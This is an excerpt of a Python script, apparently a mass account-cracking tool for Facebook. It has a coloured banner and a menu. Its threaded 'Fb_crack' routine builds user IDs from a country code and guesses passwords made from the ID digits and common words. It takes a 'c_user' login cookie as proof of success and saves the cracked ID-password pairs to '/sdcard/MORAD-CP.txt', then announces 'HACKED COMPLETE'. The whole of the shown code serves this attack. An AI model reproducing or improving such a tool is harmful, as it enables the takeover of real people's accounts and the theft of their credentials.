...
logo =("""
\033[1;36m  .d8888b.  888b     d888         .d8888b. Y88b   d88P 888888b.   8888888888 8888888b.         d8888 
\033[1;32m 88P  Y88b 8888b   d8888        d88P  Y88b Y88b d88P  888  "88b  888        888   Y88b       d88888 
\033[1;36m 88b.      88888b.d88888        888    888  Y88o88P   888  .88P  888        888    888      d88P888 
\033[1;32m  "Y888b.   888Y88888P888        888          Y888P    8888888K.  8888888    888   d88P     d88P 888 
\033[1;36m     "Y88b. 888 Y888P 888        888           888     888  "Y88b 888        8888888P"     d88P  888 
\033[1;32m       "888 888  Y8P  888 888888 888    888    888     888    888 888        888 T88b     d88P   888 
\033[1;36m 88b  d88P 888   "   888        Y88b  d88P    888     888   d88P 888        888  T88b   d8888888888 
\033[1;32m  "Y8888P"  888       888         "Y8888P"     888     8888888P"  8888888888 888   T88b d88P     888 
\033[1;91m╔═════════════════════════════════════════════╗
\033[1;92m   	  	 	   ⸨⸙⸩SM-CYBERA-71⟭⸨⸙⸩
\033[1;91m╚═════════════════════════════════════════════╝
""") 
...
def MORAD():
    ...
    print("\033[1;96m ╚═════════════════════════════════╝")
    print("")
    MORAD = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
    if MORAD in ["1","A"]:
        MORADs()
    if MORAD in ["2","B"]:
        os.system('clear')
...
def MORADs():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m ᏀᏆҒͲ ᏴƳ ᎪᏞᎻᎪᎫ ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
            uid = code+love
            Fb_crack.submit(MORADm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM MORAD ')
    print("\033[1;91m╚═══════════════════════════╝")


def MORADm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/MORAD-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
